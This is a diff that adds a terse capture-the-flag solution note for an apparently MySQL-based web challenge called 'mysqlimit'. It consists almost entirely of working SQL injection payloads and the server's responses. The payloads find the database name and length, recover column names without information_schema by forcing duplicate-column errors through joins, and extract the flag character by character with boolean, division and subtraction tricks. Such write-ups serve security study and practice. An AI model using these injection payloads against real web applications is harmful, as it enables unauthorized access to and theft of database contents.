@@ -1,0 +1,60 @@
+For id=1 => Output: <br>handsome_flag
+
+
+# Get Database name manually
+/?id=1+%26%26+length(database())+in+(1,2,3,4,5,6,7,8,9,10,11,12,13,14)
+	<br>handsome_flag
+
+Length of database is 14
+
+/?id=1+%26%26+(left(database(),1))+in+(char(97),char(98),char(99),char(100),char(101),char(102))
+	<br>handsome_flag
+
+database starts with 'f'
+database: flag_here_hoho
+
+# Get Database name (error-based)
+/?id=1+%26%26+(left(database(),1))+in+(char(97),chr(98),char(99),char(100),char(101),char(102)) 
+	execute command denied to user 'mysqlimit'@'localhost' for routine 'flag_here_hoho.chr'
+
+
+# From Source code
+Table name: flag_here_hihi
+
+# Find Column name (Extract columns name without information_schema)
+/?id=1+%26%26+(SELECT+*+from+flag_here_hoho.flag_here_hihi)+in+(1)
+	Operand should contain 3 column(s)
+
+(select * from (select * from flag_here_hihi as a join flag_here_hihi as b)as c)
+	Duplicate column name 'id'
+
+(select * from (select * from flag_here_hihi as a join flag_here_hihi as b using(id))as c)
+	Duplicate column name 't_fl4g_name_su'
+
+(select * from (select * from flag_here_hihi as a join flag_here_hihi as b using(id,t_fl4g_name_su))as c)
+	Duplicate column name 't_fl4g_v3lue_su'
+
+
+# Find Flag Length
+length((select+t_fl4g_v3lue_su+from+flag_here_hihi+limit+0,1))+in+(1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23)
+
+# Find Flag
+left(binary(select+t_fl4g_v3lue_su+from+flag_here_hihi+limit+0,1),1)+in+(char(84)
+)
+	<br>handsome_flag
+
+
+####### Other Solutions #######
+
+Source: https://github.com/Seraphin-/ctf/blob/master/tetctf/mysqlimit.md (Use ray)
+
+# Use division to see if it's the right character
+id=ASCII(RIGHT(LEFT((SELECT t_fl4g_v3lue_su FROM flag_here_hihi LIMIT 1),{}),1))/{}.format(i, ch)
+
+Source: Official
+
+# Use minus to see if it's the right character
+ascii(right(left((select {} from flag_here_hihi limit 1),{}),1))-{}.format(flag_col, i, j)
+
+
+id=1 limit 2,1 procedure analyse()
